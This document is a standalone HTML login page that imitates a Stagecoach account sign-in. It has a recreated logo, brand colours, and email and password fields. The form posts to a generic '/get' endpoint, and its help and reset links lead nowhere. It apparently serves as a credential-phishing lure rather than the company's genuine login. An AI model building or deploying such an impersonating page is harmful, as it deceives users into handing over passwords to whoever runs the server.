<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - Stagecoach</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        stagecoach: {
                            orange: '#E65C00',
                            orangeHover: '#C44F00',
                            navy: '#001838',
                            amber: '#F2A900',
                            teal: '#00A3A6',
                            blue: '#0072CE',
                            grayBg: '#F5F6F8'
                        }
                    }
                }
            }
        }
    </script>
    <style>
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #F5F6F8;
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">

    <main class="w-full max-w-md bg-white rounded-2xl shadow-lg border border-gray-100 p-8 sm:p-10 transition-all">
        
        <div class="flex justify-center mb-6">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 90" class="w-64 h-auto" aria-label="Stagecoach Logo">
                <!-- Swirl Icon -->
                <g transform="translate(10, 5)">
                    <!-- Yellow/Amber crescent -->
                    <path d="M 40,5 C 62,5 80,23 80,45 C 80,31 66,19 48,19 C 32,19 22,29 18,39 C 22,20 32,5 40,5 Z" fill="#F2A900" />
                    <!-- Blue crescent -->
                    <path d="M 40,85 C 18,85 0,67 0,45 C 0,59 14,71 32,71 C 48,71 58,61 62,51 C 58,70 48,85 40,85 Z" fill="#0072CE" />
                    <!-- Teal/Green crescent -->
                    <path d="M 5,40 C 5,18 23,0 45,0 C 31,0 19,14 19,32 C 19,48 29,58 39,62 C 20,58 5,48 5,40 Z" fill="#00A3A6" />
                </g>
                <!-- Stagecoach Wordmark -->
                <text x="98" y="62" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-weight="800" font-size="46" fill="#001838" letter-spacing="-1.5">Stagecoach</text>
            </svg>
        </div>

        <div class="text-center mb-8">
            <h1 class="text-2xl font-bold text-stagecoach-navy leading-snug">
                Sign In with <br><span class="text-gray-700 font-normal">your Stagecoach account</span>
            </h1>
        </div>

        <form action="/get" method="post" id="email-form-step" class="space-y-5" novalidate>
            <!-- Email Input Field -->
            <div>
                <label for="email" class="block text-xs font-semibold text-gray-600 uppercase tracking-wider mb-2">Email Address</label>
                <div class="relative">
                    <input 
                        type="email" 
                        id="email" 
                        name="email" 
                        placeholder="name@example.com" 
                        required 
                        class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-stagecoach-orange focus:border-stagecoach-orange outline-none transition text-gray-800 text-sm"
                    >
                </div>
            </div>

            <!-- Password Input Field -->
            <div>
                <div class="flex justify-between items-center mb-2">
                    <label for="password" class="block text-xs font-semibold text-gray-600 uppercase tracking-wider">Password</label>
                    <a href="#" class="text-xs text-stagecoach-orange hover:underline font-medium">Forgot?</a>
                </div>
                <div class="relative">
                    <input 
                        type="password" 
                        id="password" 
                        name="password" 
                        placeholder="Enter your password" 
                        required 
                        class="w-full px-4 py-3 pr-12 rounded-xl border border-gray-300 focus:ring-2 focus:ring-stagecoach-orange focus:border-stagecoach-orange outline-none transition text-gray-800 text-sm"
                    >
                    <!-- Toggle Password Visibility Button -->
                    <button 
                        type="button" 
                        onclick="togglePasswordVisibility()" 
                        class="absolute right-3 top-1/2 -translate-y-1/2 p-1 text-gray-400 hover:text-gray-600 focus:outline-none"
                        aria-label="Toggle Password Visibility"
                    >
                        <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                        </svg>
                        <svg id="eyeOffIcon" xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 hidden" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858-5.908A8.962 8.962 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21M3 3l18 18" />
                        </svg>
                    </button>
                </div>
            </div>

            <!-- Submit Button -->
            <button 
                type="submit" 
                class="w-full bg-stagecoach-orange hover:bg-stagecoach-orangeHover text-white font-semibold py-3.5 px-4 rounded-xl shadow-md transition duration-200 focus:ring-4 focus:ring-orange-200 active:scale-[0.99]"
            >
                Next
            </button>
        </form>

        <div class="mt-8 pt-6 border-t border-gray-100 text-center text-xs text-gray-500">
            <p>Need help? Visit our <a href="#" class="text-stagecoach-navy font-semibold hover:underline">Help Centre</a></p>
        </div>
    </main>

    <script>
        function togglePasswordVisibility() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.getElementById('eyeIcon');
            const eyeOffIcon = document.getElementById('eyeOffIcon');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.classList.add('hidden');
                eyeOffIcon.classList.remove('hidden');
            } else {
                passwordInput.type = 'password';
                eyeIcon.classList.remove('hidden');
                eyeOffIcon.classList.add('hidden');
            }
        }
    </script>
</body>
</html>
